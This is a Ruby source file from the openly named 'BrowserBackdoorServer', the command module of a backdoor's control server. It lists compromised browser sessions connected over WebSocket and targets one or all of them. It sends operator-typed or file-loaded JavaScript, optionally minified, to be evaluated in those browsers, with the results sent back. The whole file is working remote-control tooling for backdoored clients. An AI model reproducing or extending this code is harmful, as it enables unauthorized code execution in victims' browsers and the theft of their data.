#
# Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
# BrowserBackdoorServer by IMcPwn.
# See the file 'LICENSE' for copying permission
#

require_relative 'printcolor'
require_relative 'websocket'
require 'colorize'

module Bbs

module Command
    def Command.sendAllSessions(cmd, wsList)
        wsList.each_with_index {|_item, index|
            Bbs::WebSocket.sendCommand(cmd, wsList[index])
        }
    end

    def Command.infoCommand(log, info_commands, selected, wsList)
        info_commands.each {|_key, cmd|
            begin
                if selected != -1
                    Bbs::WebSocket.sendCommand(cmd, wsList[selected])
                else
                    sendAllSessions(cmd, wsList)
                end
            rescue => e
                log.error("Error executing info command: #{e.message}.")
                Bbs::PrintColor.print_error("Error executing info command: #{e.message}.")
                break
            end
        }
    end

    def Command.sessionsCommand(selected, wsList)
        if wsList.length < 1
            puts "No sessions"
            return
        end
        puts "The session ID with astericks is the currently targeted session."
        puts "If no target is selected (ID -1), all sessions are targeted."
        puts "ID : Identifier"
        wsList.each_with_index {|val, index|
            if index == selected
                current = "*" + index.to_s + "*" + " : " + val.to_s
            else
                current = index.to_s + " : " + val.to_s
            end
            puts current
        }
    end

    def Command.execCommandLoop(log, wss)
        puts "Commands are sent in anonymous functions wrapped in setTimeout(fn, 0) and the eval'd results are returned."
        puts "Commands are also automatically wrapped in ws.send(), so omit any semicolons (;)."
        puts "Enter the command to send (exit to return to the previous prompt)."
        while cmdSend = Readline::readline("\ncmd ##{wss.getSelected()} > ".colorize(:magenta))
            if !Bbs::WebSocket.validSession?(wss.getSelected(), wss.getWsList())
                break
            end
            break if cmdSend == "exit"
            next if cmdSend == "" || cmdSend == nil
            selected = wss.getSelected()
            wsList = wss.getWsList()
            wsSendCmd = "ws.send(" + cmdSend + ");"
            begin
                if selected != -1
                    Bbs::WebSocket.sendCommand(wsSendCmd, wsList[selected])
                else
                    sendAllSessions(wsSendCmd, wsList)
                end
            rescue => e
                log.error("Error sending command in execCommandLoop: #{e.message}.")
                Bbs::PrintColor.print_error("Error sending command: #{e.message}.")
                next
            end
            Readline::HISTORY.push(cmdSend)
        end
    end

    def Command.execCommand(log, wss, uglify, cmdIn)
        selected = wss.getSelected()
        wsList = wss.getWsList()
        if cmdIn.length < 2
            execCommandLoop(log, wss)
        else
            begin
                file = File.open(cmdIn[1], "r")
                fileContent = file.read
                cmdSend = fileContent
                file.close
            rescue => e
                begin
                    file = File.open("modules/#{cmdIn[1]}.js", "r")
                    fileContent = file.read
                    cmdSend = fileContent
                    file.close
                rescue => e
                    log.error("Could not open file to execute in execCommand: #{e.message}.")
                    Bbs::PrintColor.print_error("Could not open file to execute. Paths attempted: #{cmdIn[1]}, modules/#{cmdIn[1]}.js. Error: #{e.message}.")
                    return
                end
            end
            if uglify
                cmdSend = uglifyJS(cmdSend)
                return if cmdSend == nil
            end
            if selected != -1
                Bbs::WebSocket.sendCommand(cmdSend, wsList[selected])
            else
                sendAllSessions(cmdSend, wsList)
            end
            if fileContent.lines.first.chomp == "// INTERACTIVE"
                execCommandLoop(log, wss)
            end
        end
    end

    def self.uglifyJS(js)
        begin
            require 'uglifier'
            return Uglifier.new.compile(js)
        rescue => e
            error_message = "Error running UglifyJS on JavaScript code: #{e.message}."
            log.error(error_message)
            Bbs::PrintColor.print_error(error_message)
            return
        end
    end

    def Command.targetCommand(wss, cmdIn)
        if cmdIn.length < 2
            Bbs::PrintColor.print_error("Usage is target SESSION_ID. Type help for help.")
            return
        end
        selectIn = cmdIn[1].to_i
        if Bbs::WebSocket.validSession?(selectIn, wss.getWsList())
            wss.setSelected(selectIn)
        else
            return
        end
        Bbs::PrintColor.print_notice("Selected session is now " + wss.getSelected().to_s + ".")
    end

    def Command.helpCommand(commands)
        commands.each do |key, array|
            print key
            print " --> "
            puts array
            puts
        end
    end

    def Command.getCertCommand()
        if File.file?("./getCert.sh")
            system("./getCert.sh")
            return
        end
        print "Enter the location of getCert.sh: "
        path = gets.chomp
        if File.file?(path)
            system("./" + path)
        else
            Bbs::PrintColor.print_error(path + " does not exist")
        end
    end

    def Command.clearCommand()
        puts "\e[H\e[2J"
    end

    def Command.lsCommand(cmdIn)
        if cmdIn.length < 2
            puts Dir.glob('*').select{ |e| File.file? e }.join(' ')
            puts Dir.glob('*').select{ |e| File.directory? e }.join(' ').colorize(:blue)
        else
            puts Dir.glob(cmdIn[1] + "/*").select{ |e| File.file? e }.join(' ')
            puts Dir.glob(cmdIn[1] + "/*").select{ |e| File.directory? e }.join(' ').colorize(:blue)
        end
    end

    def Command.catCommand(log, cmdIn)
        if cmdIn.length < 2
            Bbs::PrintColor.print_error("Usage is cat FILE_PATH. Type help for help.")
        else
            begin
                file = File.open(cmdIn[1], "r")
                puts file.read
                file.close
            rescue => e
                log.error("Error opening file in cat: #{e.message}.")
                Bbs::PrintColor.print_error("Error opening file to read: #{e.message}.")
                return
            end
        end
    end

    def Command.modulesCommand()
        puts "Modules with a star (*) afterwords are interactive modules."
        puts
        modules = Dir.glob("modules/*.js").select{ |e| File.file? e }
        modules.each do |currModule|
            begin
                file = File.open(currModule)
                fileContent = file.read
                file.close
                print currModule.gsub(/(modules\/|.\js)/, '')
                if fileContent.lines.first.chomp == "// INTERACTIVE"
                  print "*"
                end
                print " "
            rescue => e
                Bbs::PrintColor.print_error("Error reading module #{currModule}: #{e.message}.")
                next
            end
        end
    end
end

end

